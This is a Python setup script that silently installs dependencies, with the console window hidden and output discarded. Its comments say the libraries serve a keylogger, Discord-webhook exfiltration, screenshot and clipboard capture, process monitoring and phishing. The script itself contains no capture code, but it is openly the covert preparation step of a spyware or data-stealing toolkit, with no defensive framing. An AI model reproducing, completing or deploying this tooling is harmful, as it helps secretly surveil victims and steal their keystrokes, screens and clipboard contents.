import os
import subprocess
import sys

# List of required libraries
required_libraries = [
    "pynput",       # For keylogger
    "requests",     # For Discord webhook integration
    "pyautogui",    # For screenshot capture
    "pyperclip",    # For clipboard monitoring
    "psutil",       # For process monitoring
    "flask",        # For phishing simulation
    "cryptography", # For encryption/decryption
    "pillow",       # For image processing (used by pyautogui)
    "keyboard"      # For keyboard input simulation
]

# Function to install a library without opening a window
def install_library(library):
    try:
        # Use CREATE_NO_WINDOW flag to suppress window creation
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        # Run pip install command
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", library],
            startupinfo=startupinfo,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"Successfully installed {library}.")
    except Exception as e:
        print(f"Failed to install {library}: {e}")

# Install all required libraries
for lib in required_libraries:
    install_library(lib)

print("All required libraries have been installed.")